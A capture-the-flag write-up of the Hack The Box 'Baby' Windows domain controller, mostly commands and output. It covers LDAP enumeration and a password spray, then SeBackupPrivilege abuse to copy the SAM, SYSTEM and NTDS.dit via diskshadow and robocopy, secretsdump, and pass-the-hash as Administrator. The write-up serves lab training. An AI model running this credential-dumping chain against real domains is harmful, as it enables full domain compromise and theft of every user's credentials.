---
tags:
  - HTB
  - Windows
  - Boot2Root
  - Hacking
---
# Overview

| Name        | Baby      |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[/mnt/c/Users/At0m/Downloads]
└─$ sudo nmap -sC -sV -T4 10.129.234.71
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 16:24 +0545
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 16:25 (0:00:00 remaining)
Nmap scan report for 10.129.234.71 (10.129.234.71)
Host is up (0.28s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-29 10:39:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-18T12:14:43
|_Not valid after:  2026-02-17T12:14:43
|_ssl-date: 2025-12-29T10:40:11+00:00; -44s from scanner time.
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-29T10:39:32+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-12-29T10:39:34
|_  start_date: N/A
|_clock-skew: mean: -43s, deviation: 0s, median: -44s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.20 seconds
```

```bash
echo "10.129.234.71 baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts
```
# Enumeration

Anonymous login is disabled except LDAP.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[/mnt/c/Users/At0m/Downloads]
└─$ netexec ldap BabyDC.baby.vl -u '' -p '' --users
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\:
LDAP        10.129.234.71   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.234.71   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.234.71   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.234.71   389    BABYDC           Jacqueline.Barnett            2021-11-21 20:56:03 0
LDAP        10.129.234.71   389    BABYDC           Ashley.Webb                   2021-11-21 20:56:03 0
LDAP        10.129.234.71   389    BABYDC           Hugh.George                   2021-11-21 20:56:03 0
LDAP        10.129.234.71   389    BABYDC           Leonard.Dyer                  2021-11-21 20:56:03 0
LDAP        10.129.234.71   389    BABYDC           Connor.Wilkinson              2021-11-21 20:56:08 0
LDAP        10.129.234.71   389    BABYDC           Joseph.Hughes                 2021-11-21 20:56:08 0
LDAP        10.129.234.71   389    BABYDC           Kerry.Wilson                  2021-11-21 20:56:08 0
LDAP        10.129.234.71   389    BABYDC           Teresa.Bell                   2021-11-21 20:59:37 0        Set initial password to BabyStart123!
```

```bash
netexec ldap BabyDC.baby.vl -u '' -p '' --users --users-export users.txt
```
## Password Spray

```bash
netexec smb BabyDC.baby.vl -u users.txt -p 'BabyStart123!' --continue-on-success
```

Failed.

- Apparently, LDAP user enumeration is based on`sAMAccountName` property.
- There are some accounts that don’t have this property due to being disabled, incomplete, corrupt, misconfigured, or simply created to run services.
- We will try a custom query to return all objects, but this will generate a very long result, so we’ll filter it using `grep`.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/baby]
└─$ netexec ldap BabyDC.baby.vl -u '' -p '' --query "(objectClass=*)" "" | grep Response
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Guest,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=krbtgt,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Computers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Schema Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Users,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Guests,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Protected Users,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Key Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=dev,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=it,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

We get few new usernames.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/baby]
└─$ netexec smb baby.vl -u 'Caroline.Robinson' -p 'BabyStart123!'
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

Credential `Caroline.Robinson:BabyStart123!` is valid, but we can't log in unless we change the password.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/baby]
└─$ smbpasswd -r 10.129.234.71 -U Caroline.Robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

Evil winrm also works.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/baby]
└─$ evil-winrm -i baby.vl -u Caroline.Robinson -p Test123.

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cat ..\Desktop\user.txt
e573cf25510907d917d388c8545ddf24
```
# Privilege Escalation

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> net user Caroline.Robinson
User name                    Caroline.Robinson
Full Name                    Caroline Robinson
Comment
Users comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/29/2025 10:51:37 AM
Password expires             2/9/2026 10:51:37 AM
Password changeable          12/30/2025 10:51:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Backup Operators
Global Group memberships     *it                   *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

- `SeBackupPrivilege`: Can read any file regardless of permission
- `SeRestorePrivilege`: Can write and restore files anywhere regardless of access control
## Registry Hive Extraction

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download sam sam

Info: Downloading C:\Users\Caroline.Robinson\Documents\sam to sam

Info: Download successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download system system
```

```bash
impacket-secretsdump -sam sam -system system local
```

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/baby]
└─$ netexec smb baby.vl -u Administrator -H 8d992faed38128ae85e95fa35868bb43
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE
```

PTH didn't work.
## Domain Hash Dump

- Unlike hive dumping, which targets local accounts, domain hash dumping targets all domain user accounts in Active Directory.
- It requires the `SYSTEM` hive (already obtained from the previous step) and `NTDS.dit` (the Active Directory database).
- The problem is that `NTDS.dit` is constantly used by AD service and can't be copied directly.
- But we can use `diskshadow` to create a copy of the entire volume (`C:`), and from there, we can extract only the `NTDS.dit` file.
- Then just like before, the file will then be transferred to our attack host and extracted using `secretsdump`.

- `Diskshadow` works based on a provided script file. Let's create one on our attack host:

```bash
set verbose on
set metadata C:\Windows\Temp\test.cab
set context persistent
add volume C: alias cdrive
create
expose %cdrive% E:
```

- Save as `script.txt`

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/baby]
└─$ unix2dos script.txt
unix2dos: converting file script.txt to DOS format...
```

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload script.txt script.txt

Info: Uploading /mnt/c/Users/At0m/Downloads/baby/script.txt to C:\Users\Caroline.Robinson\Documents\script.txt

Data: 180 bytes of 180 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  12/29/2025 10:59:37 AM

-> set verbose on
-> set metadata C:\Windows\Temp\test.cab
-> set context persistent
-> add volume C: alias cdrive
-> create
ls E:\
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
        + Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
        + Adding component: \PerformanceCounters

* Including writer "System Writer":
        + Adding component: \System Files
        + Adding component: \Win32 Services Files

* Including writer "ASR Writer":
        + Adding component: \ASR\ASR
        + Adding component: \Volumes\Volume{711fc68a-0000-0000-0000-100000000000}
        + Adding component: \Disks\harddisk0
        + Adding component: \BCD\BCD

* Including writer "DFS Replication service writer":
        + Adding component: \SYSVOL\8D6E7361-AC28-4EC5-9914-ACB6AE407BCB-2EB58465-8BD4-4748-9135-FE1B23D5A20B

* Including writer "Registry Writer":
        + Adding component: \Registry

* Including writer "COM+ REGDB Writer":
        + Adding component: \COM+ REGDB

* Including writer "WMI Writer":
        + Adding component: \WMI

* Including writer "NTDS":
        + Adding component: \C:_Windows_NTDS\ntds


Alias cdrive for shadow ID {4267d95e-f6d0-458f-aacb-4c0460c7eff0} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {b033a6a1-7d45-4178-b89a-27df924c56cf} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file BCDocument.xml into .cab file test.cab
Inserted file WM0.xml into .cab file test.cab
Inserted file WM1.xml into .cab file test.cab
Inserted file WM2.xml into .cab file test.cab
Inserted file WM3.xml into .cab file test.cab
Inserted file WM4.xml into .cab file test.cab
Inserted file WM5.xml into .cab file test.cab
Inserted file WM6.xml into .cab file test.cab
Inserted file WM7.xml into .cab file test.cab
Inserted file WM8.xml into .cab file test.cab
Inserted file WM9.xml into .cab file test.cab
Inserted file WM10.xml into .cab file test.cab
Inserted file DisD10A.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {b033a6a1-7d45-4178-b89a-27df924c56cf}

        * Shadow copy ID = {4267d95e-f6d0-458f-aacb-4c0460c7eff0}        %cdrive%
                - Shadow copy set: {b033a6a1-7d45-4178-b89a-27df924c56cf}%VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 12/29/2025 10:59:59 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {4267d95e-f6d0-458f-aacb-4c0460c7eff0}
The shadow copy was successfully exposed as E:\.
->
```

Confirm it created it:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> ls E:\


    Directory: E:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/19/2021   6:24 AM                EFI
d-----         4/16/2025   9:17 AM                inetpub
d-----          5/8/2021   8:20 AM                PerfLogs
d-r---         4/16/2025   8:35 AM                Program Files
d-----         4/16/2025   9:38 AM                Program Files (x86)
d-r---         7/27/2024  10:27 PM                Users
d-----         8/20/2025   9:07 AM                Windows
```

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> robocopy /b E:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, December 29, 2025 11:01:17 AM
   Source : E:\Windows\ntds\
     Dest : C:\Users\Caroline.Robinson\Documents\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    E:\Windows\ntds\
            New File              16.0 m        ntds.dit
  0.0%
  0.3%
  0.7%
  1.1%
  1.5%
  1.9%
  2.3%
  2.7%
  3.1%
  3.5%
  3.9%
  4.2%
  4.6%
  5.0%
  5.4%
  5.8%
  6.2%
  6.6%
  7.0%
  7.4%
  7.8%
  8.2%
  8.5%
  8.9%
  9.3%
  9.7%
 10.1%
 10.5%
 10.9%
 11.3%
 11.7%
 12.1%
 12.5%
 12.8%
 13.2%
 13.6%
 14.0%
 14.4%
 14.8%
 15.2%
 15.6%
 16.0%
 16.4%
 16.7%
 17.1%
 17.5%
 17.9%
 18.3%
 18.7%
 19.1%
 19.5%
 19.9%
 20.3%
 20.7%
 21.0%
 21.4%
 21.8%
 22.2%
 22.6%
 23.0%
 23.4%
 23.8%
 24.2%
 24.6%
 25.0%
 25.3%
 25.7%
 26.1%
 26.5%
 26.9%
 27.3%
 27.7%
 28.1%
 28.5%
 28.9%
 29.2%
 29.6%
 30.0%
 30.4%
 30.8%
 31.2%
 31.6%
 32.0%
 32.4%
 32.8%
 33.2%
 33.5%
 33.9%
 34.3%
 34.7%
 35.1%
 35.5%
 35.9%
 36.3%
 36.7%
 37.1%
 37.5%
 37.8%
 38.2%
 38.6%
 39.0%
 39.4%
 39.8%
 40.2%
 40.6%
 41.0%
 41.4%
 41.7%
 42.1%
 42.5%
 42.9%
 43.3%
 43.7%
 44.1%
 44.5%
 44.9%
 45.3%
 45.7%
 46.0%
 46.4%
 46.8%
 47.2%
 47.6%
 48.0%
 48.4%
 48.8%
 49.2%
 49.6%
 50.0%
 50.3%
 50.7%
 51.1%
 51.5%
 51.9%
 52.3%
 52.7%
 53.1%
 53.5%
 53.9%
 54.2%
 54.6%
 55.0%
 55.4%
 55.8%
 56.2%
 56.6%
 57.0%
 57.4%
 57.8%
 58.2%
 58.5%
 58.9%
 59.3%
 59.7%
 60.1%
 60.5%
 60.9%
 61.3%
 61.7%
 62.1%
 62.5%
 62.8%
 63.2%
 63.6%
 64.0%
 64.4%
 64.8%
 65.2%
 65.6%
 66.0%
 66.4%
 66.7%
 67.1%
 67.5%
 67.9%
 68.3%
 68.7%
 69.1%
 69.5%
 69.9%
 70.3%
 70.7%
 71.0%
 71.4%
 71.8%
 72.2%
 72.6%
 73.0%
 73.4%
 73.8%
 74.2%
 74.6%
 75.0%
 75.3%
 75.7%
 76.1%
 76.5%
 76.9%
 77.3%
 77.7%
 78.1%
 78.5%
 78.9%
 79.2%
 79.6%
 80.0%
 80.4%
 80.8%
 81.2%
 81.6%
 82.0%
 82.4%
 82.8%
 83.2%
 83.5%
 83.9%
 84.3%
 84.7%
 85.1%
 85.5%
 85.9%
 86.3%
 86.7%
 87.1%
 87.5%
 87.8%
 88.2%
 88.6%
 89.0%
 89.4%
 89.8%
 90.2%
 90.6%
 91.0%
 91.4%
 91.7%
 92.1%
 92.5%
 92.9%
 93.3%
 93.7%
 94.1%
 94.5%
 94.9%
 95.3%
 95.7%
 96.0%
 96.4%
 96.8%
 97.2%
 97.6%
 98.0%
 98.4%
 98.8%
 99.2%
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           118,987,347 Bytes/sec.
   Speed :             6,808.511 MegaBytes/min.
   Ended : Monday, December 29, 2025 11:01:17 AM

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download ntds.dit ntds.dit

Info: Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit to ntds.dit
```

- Now we have the `SYSTEM` hive and `ntds.dit`. Let's start dumping the credentials.
- `LOCAL` here means we are parsing local files:

```bash
secretsdump.py -ntds ntds.dit -system system LOCAL
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[/mnt/…/Users/At0m/Downloads/baby]
└─$ evil-winrm -i baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

---